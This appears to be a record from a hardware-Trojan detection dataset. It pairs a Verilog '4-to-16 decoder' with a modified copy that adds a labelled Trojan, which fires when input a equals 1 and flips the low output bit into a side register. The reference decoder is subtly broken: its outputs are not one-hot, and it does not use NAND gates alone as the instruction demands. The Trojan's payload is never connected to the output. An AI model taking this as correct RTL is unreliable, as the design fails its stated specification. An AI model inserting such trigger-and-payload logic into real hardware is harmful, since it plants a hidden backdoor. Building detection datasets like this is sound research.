@@ -1,0 +1,19 @@
+{
+    "sample_id": "SRTL_337",
+    "instruction": "Design a 4-to-16 decoder using Verilog. The module should have two input ports, each capable of accepting 2-bit binary numbers. The output port should be able to provide a 16-bit binary number, with only one bit of the output being high at any given time. The module must be designed using only NAND gates.",
+    "original_rtl": "module decoder_4to16(\n    input [1:0] a,\n    input [1:0] b,\n    output reg [15:0] out\n);\n    \n    wire nand1, nand2, nand3, nand4, nand5, nand6, nand7, nand8;\n    wire nand9, nand10, nand11, nand12, nand13, nand14, nand15, nand16;\n    \n    assign nand1 = ~(a[1] & a[0]);\n    assign nand2 = ~(a[1] & ~a[0]);\n    assign nand3 = ~(~a[1] & a[0]);\n    assign nand4 = ~(~a[1] & ~a[0]);\n    \n    assign nand5 = ~(b[1] & b[0]);\n    assign nand6 = ~(b[1] & ~b[0]);\n    assign nand7 = ~(~b[1] & b[0]);\n    assign nand8 = ~(~b[1] & ~b[0]);\n    \n    assign nand9 = ~(nand1 & nand5);\n    assign nand10 = ~(nand1 & nand6);\n    assign nand11 = ~(nand1 & nand7);\n    assign nand12 = ~(nand1 & nand8);\n    \n    assign nand13 = ~(nand2 & nand5);\n    assign nand14 = ~(nand2 & nand6);\n    assign nand15 = ~(nand2 & nand7);\n    assign nand16 = ~(nand2 & nand8);\n    \n    always @ (a, b) begin\n        out[0] = nand9;\n        out[1] = nand10;\n        out[2] = nand11;\n        out[3] = nand12;\n        out[4] = nand13;\n        out[5] = nand14;\n        out[6] = nand15;\n        out[7] = nand16;\n        out[8] = ~(nand3 & nand5);\n        out[9] = ~(nand3 & nand6);\n        out[10] = ~(nand3 & nand7);\n        out[11] = ~(nand3 & nand8);\n        out[12] = ~(nand4 & nand5);\n        out[13] = ~(nand4 & nand6);\n        out[14] = ~(nand4 & nand7);\n        out[15] = ~(nand4 & nand8);\n    end\n    \nendmodule",
+    "modified_rtl": "module decoder_4to16(\n    input [1:0] a,\n    input [1:0] b,\n    output reg [15:0] out\n);\n    \n    wire nand1, nand2, nand3, nand4, nand5, nand6, nand7, nand8;\n    wire nand9, nand10, nand11, nand12, nand13, nand14, nand15, nand16;\n    \n    assign nand1 = ~(a[1] & a[0]);\n    assign nand2 = ~(a[1] & ~a[0]);\n    assign nand3 = ~(~a[1] & a[0]);\n    assign nand4 = ~(~a[1] & ~a[0]);\n    \n    assign nand5 = ~(b[1] & b[0]);\n    assign nand6 = ~(b[1] & ~b[0]);\n    assign nand7 = ~(~b[1] & b[0]);\n    assign nand8 = ~(~b[1] & ~b[0]);\n    \n    assign nand9 = ~(nand1 & nand5);\n    assign nand10 = ~(nand1 & nand6);\n    assign nand11 = ~(nand1 & nand7);\n    assign nand12 = ~(nand1 & nand8);\n    \n    assign nand13 = ~(nand2 & nand5);\n    assign nand14 = ~(nand2 & nand6);\n    assign nand15 = ~(nand2 & nand7);\n    assign nand16 = ~(nand2 & nand8);\n    \n    always @ (a, b) begin\n        out[0] = nand9;\n        out[1] = nand10;\n        out[2] = nand11;\n        out[3] = nand12;\n        out[4] = nand13;\n        out[5] = nand14;\n        out[6] = nand15;\n        out[7] = nand16;\n        out[8] = ~(nand3 & nand5);\n        out[9] = ~(nand3 & nand6);\n        out[10] = ~(nand3 & nand7);\n        out[11] = ~(nand3 & nand8);\n        out[12] = ~(nand4 & nand5);\n        out[13] = ~(nand4 & nand6);\n        out[14] = ~(nand4 & nand7);\n        out[15] = ~(nand4 & nand8);\n    end\n    \n\n\n// HT_START\n// Trojan Type: Lightweight_Payload_Override\nreg htrojan_trig;\nreg [15:0] htrojan_pay;\nalways @(*) begin\n    htrojan_trig = (a == 2'h1);\n    htrojan_pay = htrojan_trig ? (out ^ 16'h0001) : out;\nend\n// HT_END\nendmodule",
+    "source_index": 337,
+    "label": "trojan",
+    "trojan_type": "Lightweight_Payload_Override",
+    "trigger_nodes": [
+        "htrojan_trig",
+        "a"
+    ],
+    "payload_nodes": [
+        "htrojan_pay",
+        "out"
+    ],
+    "obfuscation_applied": false,
+    "obfuscation_type": null
+}
